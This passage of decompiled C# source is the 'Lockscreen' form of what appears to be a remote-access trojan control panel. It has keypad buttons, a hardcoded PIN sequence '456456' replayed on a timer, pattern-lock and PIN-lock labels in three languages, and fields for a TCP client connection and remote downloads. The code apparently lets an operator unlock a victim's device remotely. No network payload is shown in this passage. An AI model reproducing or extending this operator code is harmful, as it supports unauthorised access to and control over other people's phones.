			this.LockKey6();
		}

		// Token: 0x06000C31 RID: 3121 RVA: 0x000076B7 File Offset: 0x000058B7
		private void guna2GradientCircleButton9_Click(object sender, EventArgs e)
		{
			this.LockKey7();
		}

		// Token: 0x06000C32 RID: 3122 RVA: 0x000076BF File Offset: 0x000058BF
		private void guna2GradientCircleButton8_Click(object sender, EventArgs e)
		{
			this.LockKey8();
		}

		// Token: 0x06000C33 RID: 3123 RVA: 0x000076C7 File Offset: 0x000058C7
		private void guna2GradientCircleButton7_Click(object sender, EventArgs e)
		{
			this.LockKey9();
		}

		// Token: 0x06000C34 RID: 3124 RVA: 0x000076CF File Offset: 0x000058CF
		private void guna2GradientCircleButton12_Click(object sender, EventArgs e)
		{
			this.LKde();
		}

		// Token: 0x06000C35 RID: 3125 RVA: 0x000076D7 File Offset: 0x000058D7
		private void guna2GradientCircleButton11_Click(object sender, EventArgs e)
		{
			this.LockKey0();
		}

		// Token: 0x06000C36 RID: 3126 RVA: 0x000076DF File Offset: 0x000058DF
		private void guna2GradientCircleButton10_Click(object sender, EventArgs e)
		{
			this.LKej();
		}

		// Token: 0x06000C37 RID: 3127 RVA: 0x000076E7 File Offset: 0x000058E7
		private void guna2Button2_Click(object sender, EventArgs e)
		{
			this.LKWX();
		}

		// Token: 0x06000C38 RID: 3128 RVA: 0x000076EF File Offset: 0x000058EF
		private void guna2Button3_Click(object sender, EventArgs e)
		{
			this.LKSBU();
		}

		// Token: 0x06000C39 RID: 3129 RVA: 0x000076F7 File Offset: 0x000058F7
		private void guna2Button6_Click(object sender, EventArgs e)
		{
			this.LKKBU();
		}

		// Token: 0x06000C3A RID: 3130 RVA: 0x000076FF File Offset: 0x000058FF
		private void guna2Button5_Click(object sender, EventArgs e)
		{
			this.LKOS();
		}

		// Token: 0x06000C3B RID: 3131 RVA: 0x00007707 File Offset: 0x00005907
		private void guna2Button4_Click(object sender, EventArgs e)
		{
			this.LKSDU();
		}

		// Token: 0x06000C3C RID: 3132 RVA: 0x0000770F File Offset: 0x0000590F
		private void guna2Button9_Click(object sender, EventArgs e)
		{
			this.LKKDU();
		}

		// Token: 0x06000C3D RID: 3133 RVA: 0x00007717 File Offset: 0x00005917
		private void guna2Button8_Click(object sender, EventArgs e)
		{
			this.LKnn();
		}

		// Token: 0x06000C3E RID: 3134 RVA: 0x0000771F File Offset: 0x0000591F
		private void guna2Button7_Click(object sender, EventArgs e)
		{
			this.LKeb();
		}

		// Token: 0x06000C3F RID: 3135 RVA: 0x00111D38 File Offset: 0x0010FF38
		private void ExecuteKeyFunction(int number)
		{
			switch (number)
			{
			case 1:
				this.LockKey1();
				return;
			case 2:
				this.LockKey2();
				return;
			case 3:
				this.LockKey3();
				return;
			case 4:
				this.LockKey4();
				return;
			case 5:
				this.LockKey5();
				return;
			case 6:
				this.LockKey6();
				return;
			case 7:
				this.LockKey7();
				return;
			case 8:
				this.LockKey8();
				return;
			case 9:
				this.LockKey9();
				return;
			default:
				return;
			}
		}

		// Token: 0x06000C40 RID: 3136 RVA: 0x00111DB0 File Offset: 0x0010FFB0
		private void ExecuteSequenceButton_Click(object sender, EventArgs e)
		{
			string text = "456456";
			if (!this.isExecuting)
			{
				string text2 = text;
				foreach (char c in text2)
				{
					if (char.IsDigit(c))
					{
						int num = int.Parse(c.ToString());
						this.AddNumberToQueue(num);
					}
				}
				this.timer.Start();
				this.isExecuting = true;
				return;
			}
			MessageBox.Show("Sequence execution is already in progress.");
		}

		// Token: 0x06000C41 RID: 3137 RVA: 0x00007727 File Offset: 0x00005927
		private void AddNumberToQueue(int number)
		{
			this.numberQueue.Enqueue(number);
		}

		// Token: 0x06000C42 RID: 3138 RVA: 0x00111DB0 File Offset: 0x0010FFB0
		private void drakeUIButton1_Click(object sender, EventArgs e)
		{
			string text = "456456";
			if (!this.isExecuting)
			{
				string text2 = text;
				foreach (char c in text2)
				{
					if (char.IsDigit(c))
					{
						int num = int.Parse(c.ToString());
						this.AddNumberToQueue(num);
					}
				}
				this.timer.Start();
				this.isExecuting = true;
				return;
			}
			MessageBox.Show("Sequence execution is already in progress.");
		}

		// Token: 0x06000C43 RID: 3139 RVA: 0x00111E28 File Offset: 0x00110028
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (this.numberQueue.Count > 0)
			{
				int num = this.numberQueue.Dequeue();
				this.ExecuteKeyFunction(num);
				return;
			}
			this.timer.Stop();
			this.isExecuting = false;
			MessageBox.Show("Key sequence execution completed.");
		}

		// Token: 0x06000C44 RID: 3140 RVA: 0x00007735 File Offset: 0x00005935
		private void Lockscreen_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Return && this.isExecuting)
			{
				this.timer1_Tick(sender, e);
			}
		}

		// Token: 0x06000C45 RID: 3141 RVA: 0x00007751 File Offset: 0x00005951
		private void drakeUIButton2_Click(object sender, EventArgs e)
		{
			this.en();
		}

		// Token: 0x06000C46 RID: 3142 RVA: 0x00007759 File Offset: 0x00005959
		private void Lockscreen_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.DisplayIPv4Address();
		}

		// Token: 0x06000C47 RID: 3143 RVA: 0x00111E74 File Offset: 0x00110074
		private void UpdateEnglish()
		{
			this.label1.Text = "LockScreen";
			this.label7.Text = "PATTERN LOCK";
			this.guna2TextBox1.Text = "Draw pattern lock";
			this.drakeUIButtonIcon6.Text = "Stop";
			this.drakeUIButtonIcon5.Text = "Start";
			this.label8.Text = "PIN LOCK";
			this.guna2TextBox2.Text = "Enter pin";
			this.drakeUIButtonIcon8.Text = "Show";
		}

		// Token: 0x06000C48 RID: 3144 RVA: 0x00111F04 File Offset: 0x00110104
		private void UpdateChinese()
		{
			this.label1.Text = "锁定屏幕";
			this.label7.Text = "图案锁";
			this.guna2TextBox1.Text = "绘制图案锁";
			this.drakeUIButtonIcon6.Text = "停止";
			this.drakeUIButtonIcon5.Text = "开始";
			this.label8.Text = "PIN锁";
			this.guna2TextBox2.Text = "输入PIN";
			this.drakeUIButtonIcon8.Text = "显示";
		}

		// Token: 0x06000C49 RID: 3145 RVA: 0x00111F94 File Offset: 0x00110194
		private void UpdateRussian()
		{
			this.label1.Text = "Экран блокировки";
			this.label7.Text = "ПАТТЕРН БЛОКИРОВКИ";
			this.guna2TextBox1.Text = "Нарисуйте шаблон блокировки";
			this.drakeUIButtonIcon6.Text = "Стоп";
			this.drakeUIButtonIcon5.Text = "Старт";
			this.label8.Text = "PIN БЛОКИРОВКА";
			this.guna2TextBox2.Text = "Введите пин-код";
			this.drakeUIButtonIcon8.Text = "Показать";
		}

		// Token: 0x06000C4A RID: 3146 RVA: 0x00112024 File Offset: 0x00110224
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x04000F80 RID: 3968
		private Queue<int> numberQueue = new Queue<int>();

		// Token: 0x04000F81 RID: 3969
		private Timer timer = new Timer();

		// Token: 0x04000F82 RID: 3970
		private int interval = 1000;

		// Token: 0x04000F83 RID: 3971
		private bool isExecuting;

		// Token: 0x04000F84 RID: 3972
		public TcpClient Client;

		// Token: 0x04000F85 RID: 3973
		public Client classClient;

		// Token: 0x04000F86 RID: 3974
		public string DownloadsFolder;

		// Token: 0x04000F87 RID: 3975
		public string Title;

		// Token: 0x04000F88 RID: 3976
		public string ipaddress;
	}
}
